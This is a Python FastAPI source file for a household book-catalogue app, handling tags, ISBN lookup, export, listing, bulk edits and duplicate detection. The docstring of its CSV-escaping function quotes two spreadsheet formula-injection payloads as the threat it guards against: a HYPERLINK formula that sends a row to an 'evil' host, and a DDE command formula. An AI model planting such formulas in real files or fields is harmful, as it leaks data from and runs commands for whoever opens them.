import asyncio
import csv
import io
import logging
import re
from collections.abc import Callable
from concurrent.futures import ThreadPoolExecutor
from datetime import UTC, date, datetime
from typing import Annotated, Any, Final

from fastapi import APIRouter, Depends, File, HTTPException, Query, UploadFile, status
from fastapi.responses import StreamingResponse
from sqlalchemy import func, nullslast, or_
from sqlalchemy.orm import Session, joinedload, selectinload
from sqlalchemy.sql.elements import UnaryExpression

import covers
import google_books
import isbn as isbn_utils
import metadata
import settings_store
from auth import require_admin
from config import COVERS_DIR
from dependencies import (
    BookForOwner,
    BookForRead,
    BookForWrite,
    BookInTrash,
    CurrentUser,
    DbSession,
    Paging,
)
from enums import (
    BookFormat,
    BookSort,
    BulkAction,
    ExportFormat,
    LendingWillingness,
    Locale,
    OwnershipStatus,
    ReadStatus,
    SettingKey,
    TagCategory,
)
from models import (
    Book,
    Loan,
    Note,
    ReadingProgress,
    Tag,
    User,
    UserBook,
    book_tags,
    in_trash_for,
    visible_to,
)
from ratelimit import cover_backfill_limiter, metadata_limiter
from schemas import (
    BookCreate,
    BookDetailsUpdate,
    BookDiscussUpdate,
    BookEnrichmentOut,
    BookLookup,
    BookMatch,
    BookOut,
    BookRatingUpdate,
    BookStatusUpdate,
    BulkRequest,
    BulkResult,
    CoverBackfillOut,
    DuplicateGroup,
    LocationOut,
    MergeRequest,
    NoteCreate,
    NoteOut,
    OwnershipUpdate,
    Page,
    PrivacyUpdate,
    ProgressCreate,
    ProgressOut,
    PurgeResult,
    SeriesOut,
    TagCreate,
    TagOut,
)
from serialisation import book_to_out, books_to_out, match_subjects_to_tags
from uploads import read_image_upload, replace_image

logger = logging.getLogger("endpaper.books")

router = APIRouter(prefix="/api/books", tags=["books"])


# ── Tags and lookup ───────────────────────────────────────────────────────────


@router.get("/tags", response_model=list[TagOut])
def list_tags(db: DbSession, current_user: CurrentUser) -> list[TagOut]:
    """The curated vocabulary plus whatever the household has invented.

    The **client** decides the order the groups appear in (`TAG_CATEGORY_ORDER`
    in the frontend), because that is a presentation decision and it needs the
    same order in three places. This orders by name within the group, which is
    the only part the server can usefully settle.

    `book_count` is one grouped query for the whole list rather than one per
    tag: this is fetched on nearly every page, so an N+1 here is an N+1
    everywhere.
    """
    # Joined to Book and filtered, like every other query that counts books.
    # Without it the count included other members' **private** books and
    # trashed ones, and this endpoint is fetched on nearly every page, so a
    # member could watch somebody else's private additions accrue in a number
    # their own listing said was zero.
    counts = dict(
        db.query(book_tags.c.tag_id, func.count(book_tags.c.book_id))
        .join(Book, Book.id == book_tags.c.book_id)
        .filter(visible_to(current_user.id))
        .group_by(book_tags.c.tag_id)
        .all()
    )
    return [
        TagOut(
            id=tag.id,
            name=tag.name,
            category=TagCategory(tag.category),
            is_predefined=tag.is_predefined,
            book_count=counts.get(tag.id, 0),
        )
        for tag in db.query(Tag).order_by(Tag.category, Tag.name).all()
    ]


@router.post("/tags", response_model=TagOut, status_code=status.HTTP_201_CREATED)
def create_tag(payload: TagCreate, db: DbSession, current_user: CurrentUser) -> Tag:
    """Invent a tag.

    Any member, not just an admin. Public books are a shared shelf that anyone
    may curate, and a vocabulary only an admin can extend is a vocabulary
    nobody uses.

    Matched case-insensitively against what already exists, so "Cookbooks" and
    "cookbooks" cannot both appear. A collision returns the existing tag rather
    than a 409: somebody typing a name that is already there wants that tag,
    and an error would send them to find it by hand.
    """
    existing = (
        db.query(Tag).filter(func.lower(Tag.name) == payload.name.lower()).first()
    )
    if existing is not None:
        return existing

    tag = Tag(name=payload.name, category=TagCategory.CUSTOM, is_predefined=False)
    db.add(tag)
    db.commit()
    db.refresh(tag)
    return tag


@router.delete("/tags/{tag_id}", status_code=status.HTTP_204_NO_CONTENT)
def delete_tag(
    tag_id: int,
    db: DbSession,
    current_user: Annotated[User, Depends(require_admin)],
) -> None:
    """Remove a tag the household invented, and take it off every book.

    **Admin only, and deliberately asymmetric with creating one.** Creating a
    tag is additive and reversible by deleting it, so it is open to everyone.
    Deleting one is neither: it strips the tag from every book in the house at
    once, there is no undo for it as there is for a deleted book, and `Tag`
    records nobody as its author. One member should not be able to quietly
    unpick the shared vocabulary.

    A seeded tag is refused rather than deleted. `seed_tags()` runs at every
    boot and would put it straight back, so the delete would appear to work
    and then quietly undo itself at the next restart.

    Declared before `/{book_id}`: two segments, but the ordering is what keeps
    that true if either path is later reshaped.
    """
    tag = db.get(Tag, tag_id)
    if tag is None:
        raise HTTPException(status_code=404, detail="Tag not found")
    if tag.is_predefined:
        raise HTTPException(
            status_code=400,
            detail="That tag is part of the built-in list and cannot be removed.",
        )

    # The association rows go with it. `book_tags` has ON DELETE CASCADE, but
    # SQLite only enforces foreign keys when the pragma is on, so the rows are
    # cleared here rather than trusted to the database.
    db.execute(book_tags.delete().where(book_tags.c.tag_id == tag_id))
    db.delete(tag)
    db.commit()


@router.get("/lookup", response_model=BookLookup)
async def lookup_isbn(
    db: DbSession,
    current_user: CurrentUser,
    isbn: Annotated[str, Query(min_length=10, max_length=20)],
) -> BookLookup:
    # Validated before either upstream is called: a misread barcode would
    # otherwise cost two network round trips to learn nothing.
    metadata_limiter.check(current_user.username)
    canonical = isbn_utils.parse(isbn)
    if canonical is None:
        raise HTTPException(
            status_code=422,
            detail="Not a valid ISBN. Check the digits and try again.",
        )

    # The key is passed even though Google is the last source tried, because
    # the whole reason the fallback used to fail was a request that omitted it.
    result = await metadata.lookup(canonical, settings_store.google_books_api_key(db))
    if not result.found:
        raise HTTPException(**_lookup_failure(result))

    assert result.data is not None
    data = dict(result.data)
    subjects = data.pop("subjects", [])
    all_tags = db.query(Tag).all()
    return BookLookup(**data, suggested_tag_ids=match_subjects_to_tags(subjects, all_tags))


def _lookup_failure(result: metadata.Lookup) -> dict[str, Any]:
    """Turn a failed lookup into the status and wording it deserves.

    All three used to be "Book not found for this ISBN", which sends someone to
    type a book in by hand when the honest answer is that a quota will reset in
    a few minutes. 503 rather than 404 for the two transient cases, so the
    client can offer "try again" instead of "add it manually".
    """
    if result.outcome is metadata.Outcome.RATE_LIMITED:
        return {
            "status_code": status.HTTP_503_SERVICE_UNAVAILABLE,
            "detail": (
                "The book catalogues are rate limiting us right now. Wait a minute "
                "and scan again, or add the book by hand."
            ),
        }
    if result.outcome is metadata.Outcome.UNAVAILABLE:
        return {
            "status_code": status.HTTP_503_SERVICE_UNAVAILABLE,
            "detail": (
                "Could not reach the book catalogues. Check the connection, or add "
                "the book by hand."
            ),
        }
    return {
        "status_code": status.HTTP_404_NOT_FOUND,
        "detail": "No catalogue has a record for this ISBN.",
    }


@router.get("/search", response_model=list[BookMatch])
async def search_books(
    db: DbSession,
    current_user: CurrentUser,
    q: Annotated[str, Query(min_length=2, max_length=200, description="Title, author or both")],
    limit: Annotated[int, Query(ge=1, le=20)] = 10,
    lang: Annotated[
        Locale | None,
        Query(description="Prefer editions in this language when ranking"),
    ] = None,
) -> list[BookMatch]:
    """Free-text search, for adding a book nobody can scan.

    The barcode path covers a book that is physically to hand. This covers the
    rest: a book with no barcode, a damaged one, one printed before ISBNs
    existed, or one being added from a list rather than from the shelf. The
    caller picks a result and the client prefills the form from it, so nothing
    is written until a person confirms.

    **No API key is required.** This used to be Google Books only and was
    hidden entirely from a household that had not configured one, which left
    them with no way at all to add a book by title. Open Library answers
    without a key; Google is merged in on top when one is set, for the blurb
    and the categories its search index carries and Open Library's does not.

    Two segments (`/google/search`) used to guard against this being confused
    with `/{book_id}`; a single one is safe for the same reason `/export` is,
    which is that it is declared first.
    """
    api_key = ""
    if settings_store.get_bool(db, SettingKey.GOOGLE_BOOKS_ENABLED):
        # The resolved key, so an environment-supplied one counts. Absent is
        # not an error here: it costs the Google half of the results, not the
        # search.
        api_key = settings_store.google_books_api_key(db)

    metadata_limiter.check(current_user.username)
    # The reader's own language, so a German household searching a German
    # title gets the German printing first. It breaks ties only: an English
    # title still returns the English book.
    matches = await metadata.search(q, api_key, limit=limit, prefer_language=lang)

    all_tags = db.query(Tag).all()
    results: list[BookMatch] = []
    for match in matches:
        subjects = google_books.split_categories(match.get("categories"))
        results.append(
            BookMatch(
                **match,
                suggested_tag_ids=match_subjects_to_tags(subjects, all_tags),
            )
        )
    return results


# ── Export ────────────────────────────────────────────────────────────────────
#
# Declared before /{book_id}: FastAPI matches in declaration order, so the
# reverse order would make this a request for the book with id "export".


@router.get("/export")
def export_books(
    db: DbSession,
    current_user: CurrentUser,
    format: Annotated[ExportFormat, Query()] = ExportFormat.CSV,
) -> StreamingResponse:
    books = (
        db.query(Book)
        .options(joinedload(Book.added_by), selectinload(Book.tags))
        .filter(visible_to(current_user.id))
        .order_by(Book.title)
        .all()
    )

    # Batch the read statuses rather than querying per book.
    status_map: dict[int, str] = {}
    if books:
        status_map = {
            user_book.book_id: user_book.status
            for user_book in db.query(UserBook)
            .filter(
                UserBook.user_id == current_user.id,
                UserBook.book_id.in_([book.id for book in books]),
            )
            .all()
        }

    filename = f"endpaper-export-{date.today().isoformat()}.{format.value}"

    if format is ExportFormat.CSV:
        output = io.StringIO()
        writer = csv.writer(output)
        writer.writerow(
            [
                "Title", "Author", "ISBN", "Publisher", "Year",
                "Description", "Tags", "My Status", "Date Added", "Added By",
                "Format", "Condition", "Location", "Purchase Price",
                "Purchase Currency", "Purchased On", "Purchased From",
            ]
        )
        for book in books:
            # Every member-supplied cell goes through `_csv_safe`. The numeric
            # and enum columns do not need it and are passed through it anyway,
            # so adding a column cannot accidentally skip the guard.
            writer.writerow(
                [
                    _csv_safe(book.title),
                    _csv_safe(book.author),
                    _csv_safe(book.isbn),
                    _csv_safe(book.publisher),
                    book.year if book.year is not None else "",
                    _csv_safe(book.description),
                    _csv_safe("; ".join(tag.name for tag in book.tags)),
                    status_map.get(book.id, ReadStatus.UNREAD),
                    book.added_at.date().isoformat() if book.added_at else "",
                    _csv_safe(book.added_by.username if book.added_by else ""),
                    book.format or "",
                    book.condition or "",
                    _csv_safe(book.location),
                    # Back to major units for the export. A spreadsheet column
                    # of cents is not what anybody means by "what did this
                    # cost", and an export is read by people, not by us.
                    _price_column(book.purchase_price_minor),
                    book.purchase_currency or "",
                    book.purchased_at.isoformat() if book.purchased_at else "",
                    _csv_safe(book.purchase_source),
                ]
            )
        content = output.getvalue()
        media_type = "text/csv; charset=utf-8"
    else:
        blocks: list[str] = []
        for book in books:
            blocks.append(
                "\n".join(
                    [
                        f"Title: {book.title or ''}",
                        f"Author: {book.author or ''}",
                        f"ISBN: {book.isbn or ''}",
                        f"Publisher: {book.publisher or ''}",
                        f"Year: {book.year if book.year is not None else ''}",
                        f"Tags: {'; '.join(tag.name for tag in book.tags)}",
                        f"My Status: {status_map.get(book.id, ReadStatus.UNREAD)}",
                        f"Date Added: {book.added_at.date().isoformat() if book.added_at else ''}",
                        f"Added By: {book.added_by.username if book.added_by else ''}",
                        f"Description: {book.description or ''}",
                    ]
                )
            )
        content = "\n\n".join(blocks)
        media_type = "text/plain; charset=utf-8"

    return StreamingResponse(
        iter([content]),
        media_type=media_type,
        headers={"Content-Disposition": f'attachment; filename="{filename}"'},
    )


#: Characters that make a spreadsheet treat a cell as a formula rather than as
#: text. Tab and carriage return are here because Excel strips them and then
#: reads whatever follows, so a value beginning "\t=cmd..." executes too.
_FORMULA_LEAD: Final = ("=", "+", "-", "@", "\t", "\r")


def _csv_safe(value: object) -> str:
    """Neutralise a cell that a spreadsheet would run as a formula.

    Every text column of this export is member-supplied: titles, authors,
    publishers, descriptions, shelf locations and **tag names**. Tags are
    household-wide, so a tag put on a public book reaches every other member's
    export. `=HYPERLINK("http://evil/?d="&A1,"ok")` in a title exfiltrates the
    row when an admin opens the file, and `=cmd|'/c calc'!A1` is the older
    trick. `csv.writer` quotes for CSV correctness and does nothing about this.

    A leading apostrophe is the conventional fix: Excel and LibreOffice both
    treat the cell as text and hide the character. It is applied only to values
    that would otherwise be executed, so an ordinary title is untouched.
    """
    text = "" if value is None else str(value)
    return f"'{text}" if text.startswith(_FORMULA_LEAD) else text


def _price_column(minor: int | None) -> str:
    """Cents back to a plain decimal string, for the export only.

    Two decimal places always, so a column of prices lines up and a
    spreadsheet reads them as numbers rather than as text.
    """
    return "" if minor is None else f"{minor / 100:.2f}"


# ── Listing ───────────────────────────────────────────────────────────────────

# Annotated explicitly: without it mypy widens the heterogeneous values to
# `object`, and passing that to order_by() is an error.
_SORT_CLAUSES: dict[BookSort, UnaryExpression[Any]] = {
    BookSort.TITLE_ASC: Book.title.asc(),
    BookSort.TITLE_DESC: Book.title.desc(),
    BookSort.AUTHOR: Book.author.asc(),
    BookSort.YEAR_ASC: Book.year.asc(),
    BookSort.YEAR_DESC: Book.year.desc(),
    BookSort.NEWEST: Book.added_at.desc(),
}

# Series order needs two columns and a null rule, so it does not fit the table
# above. `nullslast` keeps the un-serialised books together at the end instead
# of scattering them through the list wherever SQLite puts NULL.
_SERIES_ORDER: tuple[UnaryExpression[Any], ...] = (
    nullslast(Book.series_name.asc()),
    nullslast(Book.series_index.asc()),
)


@router.get("", response_model=Page[BookOut])
def list_books(
    db: DbSession,
    current_user: CurrentUser,
    paging: Paging,
    q: Annotated[str | None, Query(max_length=200)] = None,
    status_filter: Annotated[ReadStatus | None, Query(alias="status")] = None,
    tags: Annotated[str | None, Query(description="Comma-separated tag ids")] = None,
    ownership: Annotated[OwnershipStatus | None, Query()] = None,
    format: Annotated[BookFormat | None, Query()] = None,
    lending: Annotated[LendingWillingness | None, Query()] = None,
    series: Annotated[str | None, Query(max_length=255)] = None,
    location: Annotated[str | None, Query(max_length=120)] = None,
    unrated: Annotated[bool, Query(description="Only books you have not rated")] = False,
    discuss: Annotated[
        bool, Query(description="Only books somebody has offered to talk about")
    ] = False,
    sort: Annotated[BookSort, Query()] = BookSort.TITLE_ASC,
) -> Page[BookOut]:
    query = db.query(Book).filter(visible_to(current_user.id))

    if ownership is not None:
        query = query.filter(Book.ownership == ownership)

    if format is not None:
        query = query.filter(Book.format == format)

    if lending is not None:
        query = query.filter(Book.lending == lending)

    if series is not None:
        query = query.filter(Book.series_name == series)

    if location is not None:
        query = query.filter(Book.location == location)

    if q:
        like = f"%{q}%"
        query = query.filter(
            or_(Book.title.ilike(like), Book.author.ilike(like), Book.isbn.ilike(like))
        )

    if status_filter is not None:
        query = query.join(
            UserBook,
            (UserBook.book_id == Book.id) & (UserBook.user_id == current_user.id),
            isouter=True,
        )
        if status_filter is ReadStatus.UNREAD:
            # A book with no row has never been touched, which is unread.
            query = query.filter(
                or_(UserBook.status == ReadStatus.UNREAD, UserBook.id.is_(None))
            )
        else:
            query = query.filter(UserBook.status == status_filter)

    if unrated:
        # A separate correlated exists rather than reusing the status join
        # above: that join is conditional, and depending on it here would make
        # this filter silently do nothing whenever no status filter was sent.
        #
        # `correlate(Book)` is load bearing. When the status filter *has* added
        # its own UserBook join, SQLAlchemy otherwise auto-correlates UserBook
        # out of this subquery too, leaving it with no FROM clause at all and
        # raising rather than filtering. Naming the one table to correlate
        # against keeps UserBook inside the subquery where it belongs.
        rated = (
            db.query(UserBook.id)
            .filter(UserBook.book_id == Book.id, UserBook.user_id == current_user.id)
            .filter(UserBook.rating.isnot(None))
            .correlate(Book)
        )
        query = query.filter(~rated.exists())

    if discuss:
        # **Anybody's** flag, not the caller's, which is the same choice
        # `discuss_with` on the payload makes and for the same reason: the
        # filter has to select exactly the books that carry the marker the
        # grid draws, or pressing it hides half of them.
        #
        # `correlate(Book)` for the reason spelled out above `rated`: with a
        # status filter also in play, SQLAlchemy would otherwise pull UserBook
        # out of this subquery and leave it with no FROM clause.
        offered = (
            db.query(UserBook.id)
            .filter(UserBook.book_id == Book.id)
            .filter(UserBook.wants_to_discuss.is_(True))
            .correlate(Book)
        )
        query = query.filter(offered.exists())

    if tags:
        for tag_id in (int(t) for t in tags.split(",") if t.strip().isdigit()):
            query = query.filter(Book.tags.any(Tag.id == tag_id))

    # Count before paging: `total` is how many rows match the filters, not how
    # many are on this page.
    total = query.with_entities(func.count(Book.id)).order_by(None).scalar() or 0

    # id breaks ties so paging is stable: two books with the same title would
    # otherwise be free to swap between pages.
    books = (
        query.options(joinedload(Book.added_by), selectinload(Book.tags))
        .order_by(
            *(_SERIES_ORDER if sort is BookSort.SERIES else (_SORT_CLAUSES[sort],)),
            Book.id.asc(),
        )
        .offset(paging.offset)
        .limit(paging.limit)
        .all()
    )

    return Page[BookOut](
        items=books_to_out(books, current_user, db),
        total=total,
        page=paging.page,
        page_size=paging.page_size,
    )


# ── Creating ──────────────────────────────────────────────────────────────────


def _store_cover(book: Book) -> bool:
    """Give this book the best cover available, held here where possible.

    True when something changed and the caller must commit.

    Every path that puts a book in the catalogue calls this, which is the point:
    the CSV import never resolved a cover at all, so a library that arrived by
    import showed the placeholder on every single book and no log line said why.

    Blocking, deliberately: see the note above `covers.download`. Bounded, too:
    without a ceiling a single add is up to three candidate checks and a
    download at `covers.TIMEOUT_SECONDS` each, which is 24 seconds of a spinner
    when both image services blackhole rather than refuse.
    """
    # Already held here: the URL points at this app and there is a file behind
    # it. The file test is not paranoia, it is what stops the column and the
    # directory drifting apart without anybody noticing.
    if covers.is_local(book.cover_url) and covers.stored_path(book.id) is not None:
        return False

    # Budgeted, because every caller of this is a request with a person waiting
    # at the end of it. The backfill does not come through here and passes none:
    # nothing is waiting on it and it is bounded by its batch size instead.
    resolved = covers.resolve_and_store(
        book.id, book.isbn, book.cover_url, budget=covers.INTERACTIVE_BUDGET_SECONDS
    )
    if resolved is None or resolved == book.cover_url:
        return False
    book.cover_url = resolved
    return True


def _create_book(payload: BookCreate, current_user: User, db: Session, conflict: str) -> BookOut:
    # payload.isbn is already canonical ISBN-13 (see BookCreate's validator),
    # but rows written before canonicalisation may hold the ISBN-10, so both
    # spellings are checked or the same book gets added twice.
    #
    # This query deliberately does NOT apply `visible_to`: the ISBN is unique
    # across the whole table, so a clash with somebody else's private book is
    # still a clash. That also means it sees **trashed** rows, which is the
    # trap soft deletion introduces and `_free_the_isbn` exists to resolve.
    if payload.isbn:
        forms = isbn_utils.equivalent_forms(payload.isbn)
        if forms:
            # visible_to exempt: the ISBN is UNIQUE across the whole table,
            # invisible rows included, so a filtered check would miss the row
            # that is actually going to collide and turn a 409 into a 500.
            holder = db.query(Book).filter(Book.isbn.in_(forms)).first()
            if holder is not None and not _free_the_isbn(holder, current_user, db):
                raise HTTPException(
                    status_code=status.HTTP_409_CONFLICT,
                    detail=_conflict_detail(conflict, holder, current_user),
                )
    book = Book(**payload.model_dump(), added_by_user_id=current_user.id)
    db.add(book)
    db.commit()
    db.refresh(book)
    # After the commit, because the cover is stored under the book's id and the
    # id does not exist until the row does. A failed fetch is not a failed add:
    # `store_cover` returns the remote URL, or leaves the book without one.
    if _store_cover(book):
        db.commit()
        db.refresh(book)
    return book_to_out(book, current_user, db)


def _conflict_detail(message: str, holder: Book, current_user: User) -> str | dict[str, object]:
    """The 409 body for a book whose ISBN is already taken.

    Re-scanning a book already on the shelf is not a rare mistake, it is what
    happens on the second pass through a bookcase. Answering it with a bare
    sentence leaves the reader holding the book with nothing to press: they
    have to go and find it themselves to check it really is the same edition.
    So the id travels with the message and the UI offers to open it.

    **Only when the holder is visible to the caller.** The uniqueness check
    deliberately sees every row, private ones included, so returning the id
    unconditionally would turn a 409 into a way to confirm that a particular
    member owns a particular book, which is exactly what `is_private` promises
    it will not do. In that case the message goes back on its own, and it is
    the same message, so the response does not disclose which case it was.
    """
    if holder.is_private and holder.added_by_user_id != current_user.id:
        return message
    return {"message": message, "book_id": holder.id}


def _free_the_isbn(holder: Book, current_user: User, db: Session) -> bool:
    """Clear a trashed row out of the way of a book being added again.

    Without this, deleting a book and re-scanning it reports "already exists"
    for a book the member cannot see anywhere, which is a worse bug than the
    one soft deletion fixes. `implementation.md` names mis-scan, delete,
    re-scan as the most common delete in this app, so it is also the common
    path rather than a corner.

    Purged rather than restored, so the outcome matches what deleting and
    re-adding has always done here: a fresh record. Restoring instead would
    silently hand back the record somebody had just rejected, which is exactly
    what a person who deleted it because its metadata was wrong does not want.
    Losing the undo window costs nothing: they are holding the book and adding
    it right now.

    **Only a row this member could have seen in their own trash.** Purging
    somebody else's trashed private book because their ISBN happened to match
    would destroy data they never offered up, and would confirm the book
    existed. That case keeps the 409.
    """
    if holder.deleted_at is None:
        return False
    visible = not holder.is_private or holder.added_by_user_id == current_user.id
    if not visible:
        return False
    _purge(holder, db)
    # Flushed, not committed: `_create_book` owns the transaction and commits
    # once. Without this the DELETE is still pending when the INSERT runs and
    # the unique ISBN index rejects it, which is the whole thing this avoids.
    db.flush()
    return True


@router.post("", response_model=BookOut, status_code=status.HTTP_201_CREATED)
def add_book(payload: BookCreate, db: DbSession, current_user: CurrentUser) -> BookOut:
    return _create_book(payload, current_user, db, "Book with this ISBN already exists")


@router.post("/scan", response_model=BookOut, status_code=status.HTTP_201_CREATED)
def scan_add(payload: BookCreate, db: DbSession, current_user: CurrentUser) -> BookOut:
    """Confirm-add after an ISBN lookup. Same as POST /api/books, named for the
    scan flow so the client's intent is visible in logs and metrics."""
    return _create_book(payload, current_user, db, "Book with this ISBN already in catalog")


# ── Ownership ─────────────────────────────────────────────────────────────────
#
# Whether a copy is physically on the shelf, which is a fact about the object
# and not about any one reader. See OwnershipStatus for why it is separate from
# reading status.


@router.post("/bulk", response_model=BulkResult)
def bulk_action(
    payload: BulkRequest,
    db: DbSession,
    current_user: CurrentUser,
) -> BulkResult:
    """Apply one verb to a selection of books.

    One endpoint rather than six, because every verb shares the same three
    steps: resolve the ids the caller may actually touch, apply, and report
    updated/unchanged/skipped. Six handlers would be six copies of the
    permission walk, and the fifth one added would be the one that forgot it.

    A separate `/bulk/ownership` used to sit beside this with the same body,
    the same permission walk and an identical result shape. It was removed
    rather than carried into the first tagged release: two endpoints for one
    action is two places for the next change to have to land, and dropping one
    after a release is a breaking change rather than a tidy-up.
    """
    requested = set(payload.book_ids)
    books = (
        db.query(Book)
        .filter(Book.id.in_(requested), visible_to(current_user.id))
        .all()
    )
    # Skipped covers both halves of "not yours to change": ids that do not
    # exist and ids belonging to somebody else's private book. Distinguishing
    # them in the response would disclose which of the two it was.
    skipped = len(requested) - len(books)

    handler = _BULK_HANDLERS[payload.action]
    updated, unchanged = handler(db, books, payload.value, current_user)

    db.commit()
    return BulkResult(updated=updated, unchanged=unchanged, skipped=skipped)


def _bulk_add_tag(
    db: Session, books: list[Book], value: str | int | None, current_user: User
) -> tuple[int, int]:
    tag = _require_tag(db, value)
    updated = unchanged = 0
    for book in books:
        if any(existing.id == tag.id for existing in book.tags):
            unchanged += 1
        else:
            book.tags.append(tag)
            updated += 1
    return updated, unchanged


def _bulk_remove_tag(
    db: Session, books: list[Book], value: str | int | None, current_user: User
) -> tuple[int, int]:
    tag = _require_tag(db, value)
    updated = unchanged = 0
    for book in books:
        match = next((existing for existing in book.tags if existing.id == tag.id), None)
        if match is None:
            unchanged += 1
        else:
            book.tags.remove(match)
            updated += 1
    return updated, unchanged


def _bulk_set_status(
    db: Session, books: list[Book], value: str | int | None, current_user: User
) -> tuple[int, int]:
    try:
        new_status = ReadStatus(str(value))
    except ValueError:
        raise HTTPException(status_code=422, detail=f"{value!r} is not a reading status") from None

    existing = {
        row.book_id: row
        for row in db.query(UserBook)
        .filter(
            UserBook.user_id == current_user.id,
            UserBook.book_id.in_([book.id for book in books]),
        )
        .all()
    }

    updated = unchanged = 0
    for book in books:
        user_book = existing.get(book.id)
        if user_book is not None and ReadStatus(user_book.status) is new_status:
            unchanged += 1
            continue
        if user_book is None:
            user_book = UserBook(user_id=current_user.id, book_id=book.id)
            db.add(user_book)
        # The same stamping the single-book route uses, so a bulk "mark read"
        # produces the same dates as marking them one at a time would.
        _stamp_reading_dates(user_book, new_status)
        user_book.status = new_status
        updated += 1
    return updated, unchanged


def _bulk_set_ownership(
    db: Session, books: list[Book], value: str | int | None, current_user: User
) -> tuple[int, int]:
    try:
        new_ownership = OwnershipStatus(str(value))
    except ValueError:
        raise HTTPException(
            status_code=422, detail=f"{value!r} is not an ownership status"
        ) from None

    updated = unchanged = 0
    for book in books:
        if book.ownership == new_ownership:
            unchanged += 1
        else:
            book.ownership = new_ownership
            updated += 1
    return updated, unchanged


def _bulk_set_location(
    db: Session, books: list[Book], value: str | int | None, current_user: User
) -> tuple[int, int]:
    # An empty string clears the location, which is how a box gets unpacked.
    location = str(value).strip() if value is not None else ""
    if len(location) > 120:
        raise HTTPException(status_code=422, detail="Location is too long")
    new_location = location or None

    updated = unchanged = 0
    for book in books:
        if book.location == new_location:
            unchanged += 1
        else:
            book.location = new_location
            updated += 1
    return updated, unchanged


def _bulk_delete(
    db: Session, books: list[Book], value: str | int | None, current_user: User
) -> tuple[int, int]:
    """Trash a selection. The same reversible delete as the single-book route.

    Bulk is where an accident is most expensive: this is the verb that runs
    against a few hundred selected rows at once.
    """
    for book in books:
        _trash(book, db)
    return len(books), 0


def _require_tag(db: Session, value: str | int | None) -> Tag:
    try:
        tag_id = int(str(value))
    except (TypeError, ValueError):
        raise HTTPException(status_code=422, detail="A tag id is required") from None
    tag = db.get(Tag, tag_id)
    if tag is None:
        raise HTTPException(status_code=404, detail="Tag not found")
    return tag


_BULK_HANDLERS: dict[
    BulkAction, Callable[[Session, list[Book], str | int | None, User], tuple[int, int]]
] = {
    BulkAction.ADD_TAG: _bulk_add_tag,
    BulkAction.REMOVE_TAG: _bulk_remove_tag,
    BulkAction.SET_STATUS: _bulk_set_status,
    BulkAction.SET_OWNERSHIP: _bulk_set_ownership,
    BulkAction.SET_LOCATION: _bulk_set_location,
    BulkAction.DELETE: _bulk_delete,
}


# ── Browsing by series and by shelf ───────────────────────────────────────────
#
# Declared before /{book_id}, like /export above: FastAPI matches in
# declaration order, so the reverse order makes each of these a request for the
# book with id "series".


@router.get("/series", response_model=list[SeriesOut])
def list_series(db: DbSession, current_user: CurrentUser) -> list[SeriesOut]:
    """Every series on the shelf, with the gaps in it.

    "Which ones are we missing" is the question a series view exists to answer,
    and it is answered here rather than in the client so the whole catalogue is
    considered rather than the current page.
    """
    rows = (
        db.query(Book.series_name, Book.series_index)
        .filter(Book.series_name.isnot(None), visible_to(current_user.id))
        .all()
    )

    # Counts and indexes tracked separately: a series can hold books nobody has
    # numbered, and counting the indexes would report such a series as empty.
    counts: dict[str, int] = {}
    indexes: dict[str, set[int]] = {}
    for name, index in rows:
        counts[name] = counts.get(name, 0) + 1
        indexes.setdefault(name, set())
        # Only whole numbers participate in the gap calculation. A 2.5 novella
        # is not a missing volume and must not make 2 or 3 look absent.
        if index is not None and float(index).is_integer():
            indexes[name].add(int(index))

    result: list[SeriesOut] = []
    for name in sorted(counts):
        held = indexes[name]
        # Only gaps *below* the highest number held. A series with no known
        # length has no meaningful "missing" past the end, and reporting one
        # would invent a book nobody has said exists.
        missing = sorted(set(range(1, max(held) + 1)) - held) if held else []
        result.append(
            SeriesOut(name=name, book_count=counts[name], missing_indexes=missing)
        )
    return result


@router.get("/locations", response_model=list[LocationOut])
def list_locations(db: DbSession, current_user: CurrentUser) -> list[LocationOut]:
    """The distinct shelf locations in use, most-populated first.

    Doubles as the autocomplete source for the location field. Free text with
    no suggestions turns into six spellings of "living room" within a week.
    """
    rows = (
        db.query(Book.location, func.count(Book.id))
        .filter(Book.location.isnot(None), Book.location != "", visible_to(current_user.id))
        .group_by(Book.location)
        .order_by(func.count(Book.id).desc(), Book.location)
        .all()
    )
    return [LocationOut(name=name, book_count=count) for name, count in rows]


@router.get("/duplicates", response_model=list[DuplicateGroup])
def list_duplicates(db: DbSession, current_user: CurrentUser) -> list[DuplicateGroup]:
    """Books that look like the same work under different ids.

    Matched on normalised title plus author, NOT on ISBN. The unique ISBN
    already makes exact repeats impossible, so the case left to catch is the
    one it cannot see: a hardback and a paperback are the same book and two
    legitimately different ISBNs.

    Grouping happens in Python rather than SQL because the normalisation
    (casefold, strip punctuation, drop a leading article) is not something
    SQLite can express, and the catalogue is small enough that scanning it is
    cheaper than maintaining a normalised column.
    """
    # Two nested N+1s used to live here, measured at 4002 statements and 5.5
    # seconds over 2000 books, on an endpoint that is unpaginated and backs a
    # UI page. `BookOut.tags` lazy-loaded once per book, and `books_to_out`
    # was called once per group rather than once for the lot.
    books = (
        db.query(Book)
        .options(joinedload(Book.added_by), selectinload(Book.tags))
        .filter(visible_to(current_user.id))
        .all()
    )

    groups: dict[str, list[Book]] = {}
    for book in books:
        groups.setdefault(_duplicate_key(book), []).append(book)

    duplicated = {key: members for key, members in groups.items() if len(members) > 1}
    if not duplicated:
        return []

    # One serialisation pass for every duplicate, then partitioned back into
    # groups. `books_to_out` costs a constant three statements whatever it is
    # given, so calling it per group is what made it linear in groups.
    flat = [book for members in duplicated.values() for book in members]
    serialised = {out.id: out for out in books_to_out(flat, current_user, db)}

    return [
        DuplicateGroup(key=key, books=[serialised[book.id] for book in members])
        for key, members in sorted(duplicated.items())
    ]


_ARTICLES = ("the ", "a ", "an ", "der ", "die ", "das ", "ein ", "eine ")


def _duplicate_key(book: Book) -> str:
    """Normalise a book to something two editions of it will share.

    Deliberately lossy. A key that is too tight finds nothing, and this is a
    suggestion a person then confirms, not an automatic merge.
    """

    def normalise(value: str | None) -> str:
        text = (value or "").casefold().strip()
        text = re.sub(r"[^\w\s]", "", text)
        text = re.sub(r"\s+", " ", text)
        for article in _ARTICLES:
            if text.startswith(article):
                text = text[len(article) :]
                break
        return text

    # Only the first author: "Terry Pratchett" and "Terry Pratchett, Neil
    # Gaiman" are the same book credited differently on two editions.
    #
    # Split BEFORE normalising. `normalise` strips punctuation, comma included,
    # so splitting afterwards finds nothing to split on and the whole credit
    # list becomes the key.
    first_author = (book.author or "").split(",")[0]
    return f"{normalise(book.title)}|{normalise(first_author)}"


